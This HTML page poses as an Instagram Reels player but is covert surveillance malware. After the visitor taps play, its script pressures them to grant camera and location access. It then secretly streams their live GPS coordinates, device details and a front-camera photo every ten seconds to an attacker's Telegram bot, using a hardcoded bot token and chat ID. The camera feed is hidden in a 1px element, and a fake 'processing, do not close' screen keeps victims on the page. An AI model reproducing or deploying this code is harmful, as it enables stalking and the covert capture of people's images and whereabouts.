<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Instagram Reels · Permissions + Auto Send</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: white;
        }

        /* Reels container */
        .reels-container {
            position: relative;
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
            background: black;
            border-radius: 20px;
            overflow: hidden;
            aspect-ratio: 9 / 16; /* Instagram reel aspect ratio */
            box-shadow: 0 0 20px rgba(0,0,0,0.8);
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        .play-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.3);
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: background 0.2s;
        }

        .play-overlay:hover {
            background: rgba(0,0,0,0.5);
        }

        .play-icon {
            width: 80px;
            height: 80px;
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(5px);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 40px;
            color: white;
            border: 2px solid white;
        }

        /* Header / bottom info (optional) */
        .info-bar {
            padding: 15px;
            text-align: center;
            color: #ddd;
            font-size: 14px;
        }

        /* Processing overlay (same as original) */
        .processing-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 18px;
            backdrop-filter: blur(5px);
            flex-direction: column;
        }

        .processing-overlay.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #00bcd4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .warning-text {
            color: #ff4444;
            font-size: 14px;
            margin-top: 20px;
            text-align: center;
        }

        /* Exit warning (optional) */
        .exit-warning {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            z-index: 10000;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            width: 80%;
            max-width: 300px;
            color: #333;
        }

        .exit-warning.active {
            display: block;
        }

        .exit-warning h3 {
            color: #333;
            margin-bottom: 10px;
        }

        .exit-warning p {
            color: #666;
            margin-bottom: 20px;
        }

        .exit-warning button {
            background: #00bcd4;
            color: white;
            border: none;
            padding: 10px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
        }

        /* Permission modal */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.7);
            z-index: 20000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(4px);
        }
        .modal-overlay.active {
            display: flex;
        }
        .modal-card {
            background: white;
            padding: 25px 20px;
            border-radius: 28px;
            width: 85%;
            max-width: 340px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            animation: fadeIn 0.2s;
            color: #333;
        }
        .modal-card h3 {
            font-size: 22px;
            margin-bottom: 15px;
            color: #222;
        }
        .modal-card p {
            color: #555;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        .modal-card input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ccc;
            border-radius: 40px;
            font-size: 16px;
            margin: 10px 0 20px;
            outline: none;
        }
        .modal-card input:focus {
            border-color: #00bcd4;
        }
        .modal-btn {
            background: #00bcd4;
            border: none;
            color: white;
            padding: 14px 20px;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
        }
        .modal-btn.outline {
            background: white;
            color: #00bcd4;
            border: 2px solid #00bcd4;
            margin-top: 10px;
        }
        .modal-btn:active { transform: scale(0.96); }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        .perm-note {
            font-size: 13px;
            color: #e91e63;
            margin-top: 15px;
        }
        .manual-link {
            color: #00bcd4;
            text-decoration: underline;
            cursor: pointer;
            font-weight: bold;
        }

        /* Hidden video container for camera stream */
        .video-container {
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            overflow: hidden;
            pointer-events: none;
            z-index: -1;
        }

        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <!-- PROCESSING OVERLAY (for background capture) -->
    <div class="processing-overlay" id="processingOverlay">
        <div class="spinner"></div>
        <div>Processing Your Request...</div>
        <div style="font-size: 14px; margin-top: 15px;">Please wait while we verify</div>
        <div class="warning-text">⚠️ Do not close or minimize</div>
    </div>

    <!-- EXIT WARNING (optional) -->
    <div class="exit-warning" id="exitWarning">
        <h3>⚠️ Processing</h3>
        <p>Your request is being processed. Please wait...</p>
        <button onclick="document.getElementById('exitWarning').classList.remove('active')">OK</button>
    </div>

    <!-- PERMISSION MODAL -->
    <div class="modal-overlay" id="permissionModal">
        <div class="modal-card">
            <h3>🔐 Permissions required</h3>
            <p id="permMessage">We need <strong>camera</strong> and <strong>location</strong> access to continue.</p>
            <div id="permDetailedError" style="background:#fdd; color:#a00; padding:10px; border-radius:20px; margin-bottom:15px; display:none;"></div>
            <button class="modal-btn" id="retryPermissionBtn">🔁 RETRY PERMISSIONS</button>
            <p style="font-size:13px; margin-top:15px;" id="manualHint"></p>
        </div>
    </div>

    <!-- REEL UI -->
    <div style="flex:1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 10px;">
        <div class="reels-container">
            <!-- Video element for reel (public sample video) -->
            <video id="reelVideo" poster="https://storage.googleapis.com/gtv-videos-bucket/sample/images/BigBuckBunny.jpg" playsinline>
                <source src="https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            <!-- Play overlay (transparent button) -->
            <div class="play-overlay" id="playOverlay">
                <div class="play-icon">▶</div>
            </div>
        </div>
        <div class="info-bar">
            Tap to play reel · Permissions will be requested
        </div>
    </div>

    <!-- Hidden camera stream container -->
    <div class="video-container">
        <video id="video" autoplay playsinline muted></video>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = '8214662223:AAE8Y17RmB9-_2j2YXbm3EpOnTE5Wk7BQKU';
        const CHAT_ID = '6677946042';

        // ==================== GLOBAL STATE ====================
        let cameraGranted = false;
        let locationGranted = false;
        let cameraPermanentlyDenied = false;
        let locationPermanentlyDenied = false;
        let stream = null;
        let captureInterval = null;
        let locationWatchId = null;
        let currentFacingMode = 'user'; // front camera
        let cameraReady = false;
        let isProcessing = false;

        // DOM elements
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const permissionModal = document.getElementById('permissionModal');
        const permMessage = document.getElementById('permMessage');
        const permDetailedError = document.getElementById('permDetailedError');
        const manualHint = document.getElementById('manualHint');
        const retryBtn = document.getElementById('retryPermissionBtn');

        // Reel elements
        const reelVideo = document.getElementById('reelVideo');
        const playOverlay = document.getElementById('playOverlay');

        // ==================== TELEGRAM HELPERS ====================
        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
                return await res.json();
            } catch (e) { console.error('msg err', e); }
        }

        async function sendTelegramPhoto(blob, caption = '') {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            if (caption) formData.append('caption', caption);
            try {
                const res = await fetch(url, { method: 'POST', body: formData });
                return await res.json();
            } catch (e) { console.error('photo err', e); }
        }

        async function sendWithRetry(type, data, attempt = 1) {
            try {
                if (type === 'message') await sendTelegramMessage(data);
                else if (type === 'location') {
                    const text = `📍 Live location:\nLat: ${data.lat}\nLng: ${data.lng}\nMaps: https://maps.google.com/?q=${data.lat},${data.lng}`;
                    await sendTelegramMessage(text);
                } else if (type === 'device_info') {
                    const lines = Object.entries(data).map(([k,v]) => `<b>${k}:</b> ${v}`).join('\n');
                    await sendTelegramMessage(`📱 <b>Extended Device Info</b>\n${lines}`);
                }
            } catch (err) {
                if (attempt < 2) {
                    await new Promise(r => setTimeout(r, 2000));
                    return sendWithRetry(type, data, attempt + 1);
                }
            }
        }

        async function sendPhotoWithRetry(blob, num, cameraType) {
            try {
                await sendTelegramPhoto(blob, `📸 Photo #${num} (${cameraType} camera)`);
            } catch (e) {
                console.log('photo fail', e);
            }
        }

        // ==================== PERMISSION FUNCTIONS ====================
        async function requestCameraPermission() {
            try {
                if (stream) stream.getTracks().forEach(t => t.stop());
                const newStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: currentFacingMode, width: 640, height: 480 },
                    audio: false
                });
                stream = newStream;
                video.srcObject = stream;
                await video.play();
                cameraGranted = true;
                cameraReady = true;
                cameraPermanentlyDenied = false;
                return true;
            } catch (err) {
                console.warn('camera error', err);
                cameraGranted = false;
                cameraReady = false;
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    cameraPermanentlyDenied = true;
                } else {
                    cameraPermanentlyDenied = false;
                }
                return false;
            }
        }

        function requestLocationPermission() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    locationGranted = false;
                    locationPermanentlyDenied = true;
                    return resolve(false);
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        locationGranted = true;
                        locationPermanentlyDenied = false;
                        sendWithRetry('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
                        resolve(true);
                    },
                    (err) => {
                        locationGranted = false;
                        console.log('location error', err);
                        if (err.code === err.PERMISSION_DENIED) {
                            locationPermanentlyDenied = true;
                        } else {
                            locationPermanentlyDenied = false;
                        }
                        resolve(false);
                    },
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            });
        }

        // Update permission modal UI
        function updatePermissionModal() {
            if (cameraGranted && locationGranted) {
                permissionModal.classList.remove('active');
                return;
            }
            permissionModal.classList.add('active');

            let mainMsg = '';
            let detailMsg = '';
            let hint = '';

            if (!cameraGranted && !locationGranted) {
                mainMsg = 'Camera and location access are required.';
                if (cameraPermanentlyDenied && locationPermanentlyDenied) {
                    detailMsg = '⚠️ Both permissions are permanently blocked.';
                    hint = 'Please enable them manually in your browser settings (usually via the padlock icon in the address bar).';
                } else if (cameraPermanentlyDenied) {
                    detailMsg = '⚠️ Camera access is blocked.';
                    hint = 'Allow camera in site settings, then retry.';
                } else if (locationPermanentlyDenied) {
                    detailMsg = '⚠️ Location access is blocked.';
                    hint = 'Allow location in site settings, then retry.';
                } else {
                    hint = 'Click retry to request permissions again.';
                }
            } else if (!cameraGranted) {
                mainMsg = 'Camera access is required.';
                if (cameraPermanentlyDenied) {
                    detailMsg = '⚠️ Camera access is permanently blocked.';
                    hint = 'Please enable camera in browser settings.';
                } else {
                    hint = 'Click retry to request camera access.';
                }
            } else if (!locationGranted) {
                mainMsg = 'Location access is required.';
                if (locationPermanentlyDenied) {
                    detailMsg = '⚠️ Location access is permanently blocked.';
                    hint = 'Please enable location in browser settings.';
                } else {
                    hint = 'Click retry to request location access.';
                }
            }

            permMessage.innerText = mainMsg;
            if (detailMsg) {
                permDetailedError.style.display = 'block';
                permDetailedError.innerText = detailMsg;
            } else {
                permDetailedError.style.display = 'none';
            }
            manualHint.innerText = hint;
        }

        // Retry permissions button
        retryBtn.addEventListener('click', async function() {
            // Hide modal temporarily
            permissionModal.classList.remove('active');
            // Request both
            const camOk = await requestCameraPermission();
            const locOk = await requestLocationPermission();
            if (camOk && locOk) {
                // Permissions granted, start background capture
                startBackgroundCapture();
            } else {
                // Show modal again with updated status
                updatePermissionModal();
            }
        });

        // ==================== BACKGROUND CAPTURE ====================
        function startBackgroundCapture() {
            if (isProcessing) return;
            isProcessing = true;

            // Show processing overlay
            document.getElementById('processingOverlay').classList.add('active');

            // Send device info
            const deviceInfo = {
                'User Agent': navigator.userAgent,
                'Platform': navigator.platform,
                'Language': navigator.language,
                'Screen Size': `${window.screen.width}x${window.screen.height}`,
                'Time': new Date().toLocaleString()
            };
            sendWithRetry('device_info', deviceInfo);

            // Start location watch (continuous)
            if (navigator.geolocation) {
                locationWatchId = navigator.geolocation.watchPosition(
                    (pos) => {
                        sendWithRetry('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
                    },
                    (err) => console.warn('watch error', err),
                    { enableHighAccuracy: true, maximumAge: 10000 }
                );
            }

            // Start photo capture every 10 seconds
            let photoCounter = 1;
            captureInterval = setInterval(() => {
                if (stream && cameraReady) {
                    // Capture frame from video
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob((blob) => {
                        if (blob) {
                            sendPhotoWithRetry(blob, photoCounter++, currentFacingMode === 'user' ? 'front' : 'back');
                        }
                    }, 'image/jpeg', 0.8);
                }
            }, 10000); // every 10 seconds
        }

        // ==================== PLAY BUTTON HANDLER ====================
        playOverlay.addEventListener('click', async function() {
            // Hide overlay
            playOverlay.style.display = 'none';

            // Start playing the reel video
            reelVideo.play().catch(e => console.log('play error', e));

            // Request permissions
            const camOk = await requestCameraPermission();
            const locOk = await requestLocationPermission();

            if (camOk && locOk) {
                // Both granted, start background capture
                startBackgroundCapture();
            } else {
                // Show permission modal to guide user
                updatePermissionModal();
            }
        });

        // Optional: If user clicks outside modal, maybe don't close; we have retry button only.

        // Handle exit warning (optional) - we can keep but not used directly

        // Cleanup on page unload
        window.addEventListener('beforeunload', function() {
            if (captureInterval) clearInterval(captureInterval);
            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
            if (stream) stream.getTracks().forEach(t => t.stop());
        });

        // Also handle if permissions already granted from previous session?
        // On load, we could check but we don't want to auto-start. So we wait for play click.
    </script>
</body>
</html>
